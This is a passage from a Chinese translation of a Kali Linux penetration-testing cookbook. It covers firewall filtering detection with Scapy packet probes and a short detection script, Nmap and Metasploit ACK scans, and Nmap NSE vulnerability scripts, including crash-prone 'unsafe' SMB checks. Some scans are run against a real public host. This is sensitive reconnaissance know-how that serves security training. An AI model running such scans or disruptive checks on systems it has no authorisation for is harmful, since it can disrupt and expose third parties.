    window= 8192
    chksum= None
    urgptr= 0
    options= {}
```

我们可以通过以斜杠分离变量来叠放 IP 和 TCP 层。这些层面之后赋给了新的变量，它代表整个请求。我们之后可以调用`dispaly`函数来查看请求的配置。一旦构建了请求，可以将其传递给`sr1`函数来分析响应：

```
>>> response = sr1(request,timeout=1) 
..Begin emission: 
.........Finished to send 1 packets. 
....* 
Received 16 packets, got 1 answers, remaining 0 packets 
>>> response.display() 
###[ IP ]###
    version= 4L
    ihl= 5L
    tos= 0x0
    len= 40
    id= 0
    flags= DF
    frag= 0L
    ttl= 63
    proto= tcp
    chksum= 0x9974
    src= 172.16.36.135
    dst= 172.16.36.180
    \options\
###[ TCP ]###
    sport= ssh
    dport= ftp_data
    seq= 0
    ack= 0
    dataofs= 5L
    reserved= 0L
    flags= R
    window= 0
    chksum= 0xe5b
    urgptr= 0
    options= {} 
###[ Padding ]###
    load= '\x00\x00\x00\x00\x00\x00' 
```

相同的请求可以不通过构建和堆叠每一层来执行。反之，我们使用单独的一条命令，通过直接调用函数并传递合适的参数：

```
>>> response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1) 
..Begin emission: 
........Finished to send 1 packets. 
....* 
Received 15 packets, got 1 answers, remaining 0 packets 
>>> response 
<IP  version=4L ihl=5L tos=0x0 len=40 id=0 flags=DF frag=0L ttl=63  proto=tcp chksum=0x9974 src=172.16.36.135 dst=172.16.36.180  options=[] |<TCP  sport=ssh dport=ftp_data seq=0 ack=0 dataofs=5L  reserved=0L flags=R window=0 chksum=0xe5b urgptr=0 |<Padding   load='\x00\x00\x00\x00\x00\x00' |>>>
```

要注意在这个特定场景中，注入的 ACK 封包的响应是 RST 封包。测试的下一步就是以相同方式注入 SYN 封包。

```
>>> response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =1) 
Begin emission: 
Finished to send 1 packets.

Received 9 packets, got 0 answers, remaining 1 packets
```

以相同方式发送 SYN 请求之后，没有收到任何响应，并且函数在超时时间达到只有断开了连接。这个响应组合表明发生了状态包过滤。套接字通过丢掉 SYN 请求拒绝了所有入境的连接，但是没有过滤 ACK 封包来确保仍旧存在出境连接和持续中的通信。这个响应组合可以在 Python 中测试来确认状态过滤的端口：

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import * 
>>> ACK_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose =0) 
>>> SYN_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =0) 
>>> if ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)): 
...     print "Stateful filtering in place" 
... Stateful filtering in place 
>>> exit() 
```

在使用 Scapy 生成每个请求之后，测试可以用于评估这些响应，来判断是否 ACK 或者 SYN（但不是全部）请求接受到了响应。这个测试对于识别该场景以及下一个场景十分高效，其中 SYN 注入而不是 ACK 注入接受到了响应。

SYN 注入收到了 SYN+ACK 或者 RST+ACK 响应，但是 ACK 注入没有收到响应的场景，也表明存在状态过滤。剩余的测试也一样。首先，向目标端口发送 ACK 封包。

```
>>> response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose =1) 
Begin emission: 
Finished to send 1 packets.

Received 16 packets, got 0 answers, remaining 1 packets
```

在这个场景中可以执行完全相同的测试，如果两哥注入请求之一收到响应，测试就表明存在状态过滤。

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import * 
>>> ACK_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose =0) 
>>> SYN_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =0) 
>>> if ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)): 
...     print "Stateful filtering in place" 
... Stateful filtering in place 
>>> exit() 
```

响应的组合表明，状态过滤执行在 ACK 封包上，任何来自外部的符合上下文的 ACK 封包都会被丢弃。但是，入境连接尝试的响应表明，端口没有完全过滤。

另一个可能的场景就是 SYN 和 ACK 注入都收到了预期响应。这种情况下，没有任何形式的过滤。为了对这种情况执行测试，我们首先执行 ACK 注入，之后分析响应：

```
>>> response =
sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose=1)
Begin emission: 
Finished to send 1 packets.
Received 5 packets, got 1 answers, remaining 0 packets 
>>> response.display() 
###[ IP ]###
    version= 4L
    ihl= 5L
    tos= 0x0
    len= 40
    id= 0
    flags= DF
    frag= 0L
    ttl= 64
    proto= tcp
    chksum= 0x9974
    src= 172.16.36.135
    dst= 172.16.36.180
    \options\
###[ TCP ]###
    sport= ssh
    dport= ftp_data
    seq= 0
    ack= 0
    dataofs= 5L
    reserved= 0L
    flags= R
    window= 0
    chksum= 0xe5b
    urgptr= 0
    options= {} 
###[ Padding ]###
    load= '\x00\x00\x00\x00\x00\x00' 
```

在封包未被过滤的情况下，来路不明的 ACK 封包发送给了目标端口，并应该产生返回的 RST 封包。这个 RST 封包表明，ACK 封包不符合上下文，并且打算断开连接。发送了 ACK 注入之后，我们可以向相同端口发送 SYN 注入。

```
>>> response =
sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =1) 
Begin emission: 
Finished to send 1 packets.
Received 4 packets, got 1 answers, remaining 0 packets 
>>> response.display() 
###[ IP ]###
    version= 4L
    ihl= 5L
    tos= 0x0
    len= 44
    id= 0
    flags= DF
    frag= 0L
    ttl= 64
    proto= tcp
    chksum= 0x9970
    src= 172.16.36.135
    dst= 172.16.36.180
    \options\ 
###[ TCP ]###
    sport= ssh
    dport= ftp_data
    seq= 1147718450
    ack= 1
    dataofs= 6L
    reserved= 0L
    flags= SA
    window= 5840
    chksum= 0xd024
    urgptr= 0
    options= [('MSS', 1460)] 
###[ Padding ]###
    load= '\x00\x00' 
>>> response[TCP].flags 
18L 
>>> int(response[TCP].flags) 
18 
```

在端口未过滤并打开的情况中，会返回 SYN+ACK 响应。要注意 TCP`flags`属性的实际值是个`long`变量，值为 18。这个值可以轻易使用`int`函数来转换成`int`变量。这个 18 的值是 TCP 标识位序列的十进制值。SYN 标志的十进制值为 2，而 ACK 标识的十进制值为 16。假设这里没有状态过滤，我们可以通过评估 TCP`flags`值的整数转换，在 Python 中测试端口是否未过滤并打开。

```
root@KaliLinux:~# python Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import * 
>>> ACK_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose =0) 
>>> SYN_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =0) 
>>> if ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)): 
...     print "Stateful filtering in place" 
... elif int(SYN_response[TCP].flags) == 18: 
...     print "Port is unfiltered and open" 
... elif int(SYN_response[TCP].flags) == 20: 
...     print "Port is unfiltered and closed" 
... Port is unfiltered and open 
>>> exit() 
```

我们可以执行相似的测试来判断是否端口未过滤并关闭。未过滤的关闭端口会激活 RST 和 ACK 标识。像之前那样，ACK 标识为整数 16，RST 标识为 整数 4。所以，未过滤的关闭端口的 TCP`flags`值的整数转换应该是 20：

```
root@KaliLinux:~# python Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import * 
>>> ACK_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=4444,flags='A'),timeout=1,verbo se=0) 
>>> SYN_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=4444,flags='S'),timeout=1,verbo se=0) 
>>> if ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)): 
...     print "Stateful filtering in place" 
... elif int(SYN_response[TCP].flags) == 18: 
...     print "Port is unfiltered and open"
... elif int(SYN_response[TCP].flags) == 20: 
...     print "Port is unfiltered and closed" 
... Port is unfiltered and closed 
>>> exit() 
```

最后，我们应该考虑最后一种场景，其中 SYN 或者 ACK 注入都没有收到响应。这种场景中，每个`sr1`的实例都会在超时的时候断开。

```
>>> response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='A'),timeout=1,verbose =1) 
Begin emission: 
Finished to send 1 packets.
Received 36 packets, got 0 answers, remaining 1 packets 
>>> response =  sr1(IP(dst="172.16.36.135")/TCP(dport=22,flags='S'),timeout=1,verbose =1) 
Begin emission: 
Finished to send 1 packets.
Received 18 packets, got 0 answers, remaining 1 packets 
```

每个注入封包都缺少响应，表明端口存在无状态过滤，仅仅是丢弃所有入境的流量，无论状态是什么。或者这表明远程系统崩溃了。我们的第一想法可能是，可以通过在之前的测试序列的末尾向`else`添加执行流，在 Python 中测试它。理论上，如果任何注入都没有接受到响应，`else`中的操作会执行。简单来说，`else`中的操作会在没有接收到响应的时候执行。

```
root@KaliLinux:~# python Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import * 
>>> ACK_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=4444,flags='A'),timeout=1,verbo se=0)
>>> SYN_response =  sr1(IP(dst="172.16.36.135")/TCP(dport=4444,flags='S'),timeout=1,verbo se=0) 
>>> if ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)): 
...     print "Stateful filtering in place" 
... elif int(SYN_response[TCP].flags) == 18: 
...     print "Port is unfiltered and open" 
... elif int(SYN_response[TCP].flags) == 20: 
...     print "Port is unfiltered and closed" 
... else: 
...     print "Port is either unstatefully filtered or host is down" 
...
Traceback (most recent call last):  
    File "<stdin>", line 3, in <module> 
TypeError: 'NoneType' object has no attribute '__getitem__'
```

这意味着理论上可以生效，但是实际上并不工作。操作值为空的变量的时候，Python 实际上会产生错误。为了避免这种问题，首先就需要检测没有收到任何回复的情况。


```
>>> if (ACK_response == None) and (SYN_response == None): 
...     print "Port is either unstatefully filtered or host is down" 
... Port is either unstatefully filtered or host is down 
```

这个完成的测试序列之后可以集成到单个功能性脚本中。这个脚本接受两个参数，包括目标 IP 地址和被测试的端口。之后注入 ACK 和 SYN 封包，如果存在响应，响应会储存用于评估。之后执行四个测试来判断是否端口上存在过滤。一开始，会执行测试来判断是否没有受到任何响应。如果是这样，输出会表示远程主机崩溃了，或者端口存在无状态过滤，并丢弃所有流量。如果接收到了任何请求，会执行测试来判断是否接受到了某个注入的响应，而不是全部。如果是这样，输出会表明端口存在状态过滤。最后如果两个注入都接受到了响应，端口会被识别为物过滤，并且会评估 TCP 标志位来判断端口开放还是关闭。

```py
#!/usr/bin/python

import sys import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

if len(sys.argv) != 3:   
    print "Usage - ./ACK_FW_detect.py [Target-IP] [Target Port]"   
    print "Example - ./ACK_FW_detect.py 10.0.0.5 443"   
    print "Example will determine if filtering exists on port 443 of     host 10.0.0.5"   
    sys.exit()

ip = sys.argv[1] 
port = int(sys.argv[2])

ACK_response =  sr1(IP(dst=ip)/TCP(dport=port,flags='A'),timeout=1,verbose=0) 
SYN_response =  sr1(IP(dst=ip)/TCP(dport=port,flags='S'),timeout=1,verbose=0) 
if (ACK_response == None) and (SYN_response == None):   
    print "Port is either unstatefully filtered or host is down" 
elif ((ACK_response == None) or (SYN_response == None)) and not  ((ACK_response ==None) and (SYN_response == None)):   
    print "Stateful filtering in place" 
elif int(SYN_response[TCP].flags) == 18:   
    print "Port is unfiltered and open" 
elif int(SYN_response[TCP].flags) == 20:   
    print "Port is unfiltered and closed" 
else:   
    print "Unable to determine if the port is filtered"
```

在本地文件系统创建脚本之后，需要更新文件许可来允许脚本执行。`chmod`可以用于更新这些许可，脚本之后可以通过直接调用并传入预期参数来执行：

```
root@KaliLinux:~# chmod 777 ACK_FW_detect.py 
root@KaliLinux:~# ./ACK_FW_detect.py 
Usage - ./ACK_FW_detect.py [Target-IP] [Target Port] 
Example - ./ACK_FW_detect.py 10.0.0.5 443 
Example will determine if filtering exists on port 443 of host  10.0.0.5 
root@KaliLinux:~# ./ACK_FW_detect.py 172.16.36.135 80 Port is unfiltered and open 
root@KaliLinux:~# ./ACK_FW_detect.py 172.16.36.134 22 Host is either unstatefully filtered or is down
```

### 工作原理

SYN 和 ACK TCP 标志在有状态的网络通信中起到关键作用。SYN 请求允许建立新的 TCP 会话，而 ACK 响应用于在关闭之前维持会话。端口响应这些类型的封包之一，但是不响应另一种，就可能存在过滤，它基于会话状态来限制流量。通过识别这种情况，我们就能够推断出端口上存在状态过滤。

## 4.15 Nmap 防火墙识别

Nmap 拥有简化的防火墙过滤识别功能，基于 ACK 探测响应来识别端口上的过滤。这个功能可以用于测试单一端口或者多个端口序列来判断过滤状态。

### 准备

为了使用 Nmap 来执行防火墙识别，你需要运行网络服务的远程系统。此外，你需要实现一些过滤机制。这可以使用独立防火墙设备，或者基于主机的过滤，例如 Windows 防火墙来完成。通过操作防火墙设备的过滤设置，你应该能够修改被注入封包的响应。

### 操作步骤

为了使用 Nmap 执行防火墙 ACK 扫描，Nmap 应该以指定的 IP 地址，目标端口和`-sA`选项调用。

```
root@KaliLinux:~# nmap -sA 172.16.36.135 -p 22

Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:21 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00032s latency). 
PORT   STATE      SERVICE 
22/tcp unfiltered ssh 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds 
root@KaliLinux:~# nmap -sA 83.166.169.228 -p 22

Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:25 EST
Nmap scan report for packtpub.com (83.166.169.228) 
Host is up (0.14s latency). 
PORT   STATE    SERVICE 
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds 
```

通过在本地网络中的 Metasploitable2 系统上执行扫描，流量并不经过防火墙，响应表明 TCP 22 端口是未过滤的。但是，如果我对`packtpub. com`的远程 IP 地址执行相同扫描，端口 22 是过滤器的。通过执行相同扫描，而不指定端口，端口过滤评估可以在 Nmap 的 1000 个常用端口上完成。

```
root@KaliLinux:~# nmap -sA 172.16.36.135

Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:21 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00041s latency). All 1000 scanned ports on 172.16.36.135 are unfiltered 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds 
```

对本地网络上的 Metasploit2 系统执行扫描时，由于它没有被任何防火墙保护，结果表明所有端口都是未过滤的。如果我们在`packtpub.com `域内执行相同扫描，所有端口都识别为存在过滤，除了 TCP 端口 80，这是 Web 应用部署的地方。要注意在扫描端口范围的时候，输出只包含未过滤的端口。

```
root@KaliLinux:~# nmap -sA 83.166.169.228

Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:25 EST 
Nmap scan report for packtpub.com (83.166.169.228) 
Host is up (0.15s latency). 
Not shown: 999 filtered ports 
PORT   STATE      SERVICE 
80/tcp unfiltered http

Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

为了在所有可能的 TCP 端口上执行扫描，需要奥妙所有可能的端口地址。定义了来源和目标端口地址的 TCP 头部部分是 16 位长，每一位可以为值 1 或者 0。所以一共有`2 **16`或 65536 个 TCP 端口地址。为了扫描所有可能的地址空间，必须提供 1 到 65535 的 范围。

```
root@KaliLinux:~# nmap -sA 172.16.36.135 -p 1-65535

Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:21 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00041s latency).
All 65535 scanned ports on 172.16.36.135 are unfiltered 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```

### 工作原理

除了 Nmap 提供的许多功能，它也可以用于识别防火墙过滤。这意味着 Nmap 通过使用之前在 Scapy 秘籍中讨论的相同技巧，来执行这种防火墙识别。SYN 和 来路不明的 ACK 的组合会发送给目标端口，响应用于分析来判断过滤状态。

## 4.18 Metasploit 防火墙识别

Metasploit 拥有一个扫描辅助模块，可以用于指定多线程网络端口分析，基于 SYN/ACK 探测响应分析，来判断端口是否被过滤。

### 准备

为了使用 Metasploit 来执行防火墙识别，你需要运行网络服务的远程系统。此外，你需要实现一些过滤机制。这可以使用独立防火墙设备，或者基于主机的过滤，例如 Windows 防火墙来完成。通过操作防火墙设备的过滤设置，你应该能够修改被注入封包的响应。

### 操作步骤

为了使用 Metasploit ACK 扫描模块来执行防火墙和过滤识别，你首先必须从 Kali 的终端中启动 MSF 控制台，之后使用`use`命令选项所需的辅助模块。

```
root@KaliLinux:~# msfconsole 
# cowsay++ 
 ____________ 
< metasploit > 
 -----------       
       \   ,__,        
        \  (oo)____           
           (__)    )\              
              ||--|| *
              
              
Using notepad to track pentests? Have Metasploit Pro report on hosts, services, sessions and evidence -- type 'go_pro' to launch it now.

       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
+ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf > use auxiliary/scanner/portscan/ack 
msf  auxiliary(ack) > show options

Module options (auxiliary/scanner/portscan/ack):

   Name       Current Setting  Required  Description   
   ----       ---------------  --------  ----------   
   BATCHSIZE  256              yes       The number of hosts to scan  per set   
   INTERFACE                   no        The name of the interface   
   PORTS      1-10000          yes       Ports to scan (e.g. 22- 25,80,110-900)   
   RHOSTS                      yes       The target address range or  CIDR identifier   
   SNAPLEN    65535            yes       The number of bytes to capture   
   THREADS    1                yes       The number of concurrent threads   
   TIMEOUT    500              yes       The reply read timeout in  milliseconds
```

一旦选择了模块，可以使用`show options`命令来确认或更改扫描配置。这个命令会展示四个列的表格，包括`name`、`current settings`、`required`和`description`。`name`列标出了每个可配置变量的名称。`current settings`列列出了任何给定变量的现有配置。`required`列标出对于任何给定变量，值是否是必须的。`description`列描述了每个变量的功能。任何给定变量的值可以使用`set`命令，并且将新的值作为参数来修改。

```
msf  auxiliary(ack) > set PORTS 1-100 
PORTS => 1-100 
msf  auxiliary(ack) > set RHOSTS 172.16.36.135 
RHOSTS => 172.16.36.135 
msf  auxiliary(ack) > set THREADS 25 
THREADS => 25 
msf  auxiliary(ack) > show options

Module options (auxiliary/scanner/portscan/ack):

   Name       Current Setting  Required  Description   
   ----       ---------------  --------  ----------   
   BATCHSIZE  256              yes       The number of hosts to scan  per set   
   INTERFACE                   no        The name of the interface   
   PORTS      1-100            yes       Ports to scan (e.g. 22- 25,80,110-900)   
   RHOSTS     172.16.36.135    yes       The target address range or  CIDR identifier   
   SNAPLEN    65535            yes       The number of bytes to capture   
   THREADS    25               yes       The number of concurrent threads   
   TIMEOUT    500              yes       The reply read timeout in  milliseconds 
```

在上面的例子中，`RHOSTS`值修改为我们打算扫描的远程系统的 IP 地址。此外，线程数量修改为 20。`THREADS`的值定义了在后台执行的当前任务数量。确定线程数量涉及到寻找一个平衡，既能提升任务速度，又不会过度消耗系统资源。对于多数系统，20 个线程可以足够快，并且相当合理。修改了必要的变量之后，可以再次使用`show options`命令来验证。一旦所需配置验证完毕，就可以执行扫描了。

```
msf  auxiliary(ack) > run

[*] Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
```

这个例子中，唯一提供的输出就是有关扫描的源信息，它显示了被扫描系统的数量，以及模块执行完毕。输出的缺乏是因为，和 SYN 以及 ACK 注入相关的响应从一个端口直接到达另一个端口，因为 Metasploitable2 系统没有任何防火墙。作为替代，如果我们在`packtpub.com`域上执行相同扫描，通过将`RHOSTS `值修改为和它相关的 IP 地址，我们会收到不用的输出。因为这个主机放在防火墙背后，和未过滤端口相关的响应中的变化如下：

```
msf  auxiliary(ack) > set RHOSTS 83.166.169.228 
RHOSTS => 83.166.169.228 
msf  auxiliary(ack) > show options

Module options (auxiliary/scanner/portscan/ack):

   Name       Current Setting  Required  Description   
   ----       ---------------  --------  ----------   
   BATCHSIZE  256              yes       The number of hosts to scan  per set   
   INTERFACE                   no        The name of the interface   
   PORTS      1-100            yes       Ports to scan (e.g. 22- 25,80,110-900)   
   RHOSTS     83.166.169.228   yes       The target address range or  CIDR identifier   
   SNAPLEN    65535            yes       The number of bytes to capture   
   THREADS    25               yes       The number of concurrent threads   
   TIMEOUT    500              yes       The reply read timeout in  milliseconds
   
msf  auxiliary(ack) > run

[*]  TCP UNFILTERED 83.166.169.228:80 
[*] Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed
```

### 工作原理

Metasploit 拥有一个辅助模块，可以以多种技巧执行防火墙识别，这些技巧之前讨论过。但是，Metasploit 也提供了一些功能来分析防火墙上下文，可以用于其它信息的收集甚至是利用。


# 第五章：漏洞扫描

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

尽管可以通过查看服务指纹的结果，以及研究所识别的版本的相关漏洞来识别许多潜在漏洞，但这通常需要非常大量时间。 存在更多的精简备选方案，它们通常可以为你完成大部分这项工作。 这些备选方案包括使用自动化脚本和程序，可以通过扫描远程系统来识别漏洞。 未验证的漏洞扫描程序的原理是，向服务发送一系列不同的探针，来尝试获取表明漏洞存在的响应。 或者，经验证的漏洞扫描器会使用提供所安装的应用，运行的服务，文件系统和注册表内容信息的凭证，来直接查询远程系统。

## 5.1 Nmap 脚本引擎漏洞扫描

Nmap 脚本引擎（NSE）提供了大量的脚本，可用于执行一系列自动化任务来评估远程系统。 Kali 中可以找到的现有 NSE 脚本分为多个不同的类别，其中之一是漏洞识别。


### 准备

要使用 NSE 执行漏洞分析，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，会使用存在 SMB 服务漏洞的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章“安装 Windows Server”秘籍。

### 操作步骤

许多不同的方法可以用于识别与任何给定的 NSE 脚本相关联的功能。 最有效的方法之一是使用位于 Nmap 脚本目录中的`script.db`文件。 要查看文件的内容，我们可以使用`cat`命令，像这样：

```
root@KaliLinux:~# cat /usr/share/nmap/scripts/script.db | more 
Entry { filename = "acarsd-info.nse", categories = { "discovery", "safe", } } 
Entry { filename = "address-info.nse", categories = { "default", "safe", } } 
Entry { filename = "afp-brute.nse", categories = { "brute", "intrusive", } } 
Entry { filename = "afp-ls.nse", categories = { "discovery", "safe", } } 
Entry { filename = "afp-path-vuln.nse", categories = { "exploit", "intrusive", " vuln", } } 
Entry { filename = "afp-serverinfo.nse", categories = { "default", "discovery", "safe", } } 
Entry { filename = "afp-showmount.nse", categories = { "discovery", "safe", } } 
Entry { filename = "ajp-auth.nse", categories = { "auth", "default", "safe", } }
Entry { filename = "ajp-brute.nse", categories = { "brute", "intrusive", } } 
Entry { filename = "ajp-headers.nse", categories = { "discovery", "safe", } } 
Entry { filename = "ajp-methods.nse", categories = { "default", "safe", } } 
Entry { filename = "ajp-request.nse", categories = { "discovery", "safe", } }
```

这个`script.db`文件是一个非常简单的索引，显示每个 NSE 脚本的文件名及其所属的类别。 这些类别是标准化的，可以方便地对特定类型的脚本进行`grep`。 漏洞扫描脚本的类别名称是`vuln`。 要识别所有漏洞脚本，需要对`vuln`术语进行`grep`，然后使用`cut`命令提取每个脚本的文件名。像这样：

```
root@KaliLinux:~# grep vuln /usr/share/nmap/scripts/script.db | cut -d "\"" -f 2 
afp-path-vuln.nse 
broadcast-avahi-dos.nse distcc-cve2004-2687.nse 
firewall-bypass.nse 
ftp-libopie.nse 
ftp-proftpd-backdoor.nse 
ftp-vsftpd-backdoor.nse 
ftp-vuln-cve2010-4221.nse 
http-awstatstotals-exec.nse 
http-axis2-dir-traversal.nse 
http-enum.nse http-frontpage-login.nse 
http-git.nse http-huawei-hg5xx-vuln.nse 
http-iis-webdav-vuln.nse 
http-litespeed-sourcecode-download.nse 
http-majordomo2-dir-traversal.nse 
http-method-tamper.nse http-passwd.nse 
http-phpself-xss.nse http-slowloris-check.nse 
http-sql-injection.nse 
http-tplink-dir-traversal.nse
```

为了进一步评估上述列表中任何给定脚本，可以使用`cat`命令来读取`.nse`文件，它与`script.db`目录相同。因为大多数描述性内容通常在文件的开头，建议你将内容传递给`more`，以便从上到下阅读文件，如下所示：

```
root@KaliLinux:~# cat /usr/share/nmap/scripts/smb-check-vulns.nse | more 
local msrpc = require "msrpc" 
local nmap = require "nmap" 
local smb = require "smb" 
local stdnse = require "stdnse" 
local string = require "string" 
local table = require "table"

description = [[ 
Checks for vulnerabilities: 
* MS08-067, a Windows RPC vulnerability 
* Conficker, an infection by the Conficker worm 
* Unnamed regsvc DoS, a denial-of-service vulnerability I accidentally found in Windows 2000 
* SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) 
* MS06-025, a Windows Ras RPC service vulnerability 
* MS07-029, a Windows Dns Server RPC service vulnerability

WARNING: These checks are dangerous, and are very likely to bring down a server. These should not be run in a production environment unless you (and, more importantly, the business) understand the risks! 
```

在提供的示例中，我们可以看到`smb-check-vulns.nse`脚本检测 SMB 服务相关的一些拒绝服务和远程执行漏洞。 这里，可以找到每个评估的漏洞描述，以及 Microsoft 补丁和 CVE 编号的引用，还有可以在线查询的其他信息。 通过进一步阅读，我们可以进一步了解脚本，像这样：

```

--@usage 
-- nmap 
--script smb-check-vulns.nse -p445 <host> 
-- sudo nmap -sU -sS 
--script smb-check-vulns.nse -p U:137,T:139 <host> 
---@output

-- Host script results: 
-- | smb-check-vulns: 
-- |   MS08-067: NOT VULNERABLE 
-- |   Conficker: Likely CLEAN 
-- |   regsvc DoS: regsvc DoS: NOT VULNERABLE 
-- |   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
-- |   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
-- |_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive) 
--- @args unsafe If set, this script will run checks that, if the system isn't 
--       patched, are basically guaranteed to crash something. Remember that 
--       non-unsafe checks aren't necessarily safe either) 
-- @args safe   If set, this script will only run checks that are known (or at 
--       least suspected) to be safe. 
----------------------------------------------------------------------
```

通过进一步阅读，我们可以找到脚本特定的参数，适当的用法以及脚本预期输出的示例的详细信息。要注意一个事实，有一个不安全的参数，可以设置为值 0（未激活）或 1（激活）。这实际上是 Nmap 漏洞脚本中的一个常见的现象，理解它的用法很重要。默认情况下，不安全参数设置为 0。当设置此值时，Nmap 不执行任何可能导致拒绝服务的测试。虽然这听起来像是最佳选择，但它通常意味着许多测试的结果将不太准确，并且一些测试根本不会执行。建议激活不安全参数以进行更彻底和准确的扫描，但这只应在授权测试情况下针对生产系统执行。要运行漏洞扫描，应使用`nmap --script`参数定义特定的 NSE 脚本，并使用`nmap --script-args`参数传递所有脚本特定的参数。此外，要以最小的干扰输出来运行漏洞扫描，应将 Nmap 配置为仅扫描与被扫描服务对应的端口，如下所示：

```
root@KaliLinux:~# nmap --script smb-check-vulns.nse --scriptargs=unsafe=1 -p445 172.16.36.225

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-09 03:58 EDT 
Nmap scan report for 172.16.36.225 
Host is up (0.00041s latency). 
PORT    STATE SERVICE
445/tcp open  microsoft-ds 
MAC Address: 00:0C:29:18:11:FB (VMware)

Host script results: 
| smb-check-vulns: 
|   MS08-067: VULNERABLE 
|   Conficker: Likely CLEAN 
|   regsvc DoS: NOT VULNERABLE 
|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
|   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

Nmap done: 1 IP address (1 host up) scanned in 18.21 seconds 
```

还有一个需要注意的 NSE 脚本，因为它提供了一个重要的漏洞扫描方式。 这个脚本是`smb-vulnms10-061.nse`。 这个脚本的细节可以通过使用`cat`命令`pipe`到`more`，从上到下阅读脚本来获得：

```
root@KaliLinux:~# cat /usr/share/nmap/scripts/smb-vuln-ms10-061.nse | more 
local bin = require "bin" 
local msrpc = require "msrpc" 
local smb = require "smb" 
local string = require "string" 
local vulns = require "vulns" 
local stdnse = require "stdnse"
description = [[ 
Tests whether target machines are vulnerable to ms10-061 Printer Spooler impersonation vulnerability. 
```

此漏洞是 Stuxnet 蠕虫利用的四个漏洞之一。 该脚本以安全的方式检查`vuln`，而没有崩溃远程系统的可能性，因为这不是内存损坏漏洞。 为了执行检测，它需要访问远程系统上的至少一个共享打印机。 默认情况下，它尝试使用 LANMAN API 枚举打印机，在某些系统上通常不可用。 在这种情况下，用户应将打印机共享名称指定为打印机脚本参数。 要查找打印机共享，可以使用`smb-enum-share`。

